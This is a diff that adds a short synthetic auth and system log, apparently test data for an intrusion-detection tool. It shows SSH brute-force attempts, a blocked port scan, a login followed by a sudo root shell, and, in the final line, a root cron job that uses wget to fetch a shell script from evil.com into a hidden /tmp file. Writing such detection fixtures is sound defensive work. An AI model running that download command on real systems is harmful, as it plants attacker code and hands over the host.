@@ -1,0 +1,18 @@
+Apr 29 08:00:01 sentinel-host sshd[1234]: Failed password for root from 192.168.1.105 port 22 ssh2
+Apr 29 08:00:02 sentinel-host sshd[1234]: Failed password for root from 192.168.1.105 port 22 ssh2
+Apr 29 08:00:03 sentinel-host sshd[1234]: Failed password for admin from 192.168.1.105 port 22 ssh2
+Apr 29 08:00:04 sentinel-host sshd[1234]: Failed password for admin from 192.168.1.105 port 22 ssh2
+Apr 29 08:00:05 sentinel-host sshd[1234]: Failed password for root from 192.168.1.105 port 22 ssh2
+Apr 29 08:00:06 sentinel-host sshd[1234]: Failed password for ubuntu from 192.168.1.105 port 22 ssh2
+Apr 29 08:00:07 sentinel-host sshd[1234]: Failed password for ubuntu from 192.168.1.105 port 22 ssh2
+Apr 29 08:00:08 sentinel-host sshd[1234]: Failed password for root from 192.168.1.105 port 22 ssh2
+Apr 29 08:00:09 sentinel-host sshd[1234]: Failed password for root from 192.168.1.105 port 22 ssh2
+Apr 29 08:00:10 sentinel-host sshd[1234]: Failed password for root from 192.168.1.105 port 22 ssh2
+Apr 29 08:01:00 sentinel-host kernel: [UFW BLOCK] IN=eth0 SRC=10.5.5.5 DST=10.0.0.1 PROTO=TCP DPT=22
+Apr 29 08:01:01 sentinel-host kernel: [UFW BLOCK] IN=eth0 SRC=10.5.5.5 DST=10.0.0.1 PROTO=TCP DPT=80
+Apr 29 08:01:02 sentinel-host kernel: [UFW BLOCK] IN=eth0 SRC=10.5.5.5 DST=10.0.0.1 PROTO=TCP DPT=443
+Apr 29 08:01:03 sentinel-host kernel: [UFW BLOCK] IN=eth0 SRC=10.5.5.5 DST=10.0.0.1 PROTO=TCP DPT=3306
+Apr 29 08:01:04 sentinel-host kernel: [UFW BLOCK] IN=eth0 SRC=10.5.5.5 DST=10.0.0.1 PROTO=TCP DPT=5432
+Apr 29 08:05:00 sentinel-host sshd[5678]: Accepted password for deploy from 203.0.113.10 port 48122 ssh2
+Apr 29 08:10:00 sentinel-host sudo[9012]: deploy : TTY=pts/0 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 08:15:00 sentinel-host cron[1111]: (root) CMD (/usr/bin/wget -O /tmp/.x http://evil.com/shell.sh)
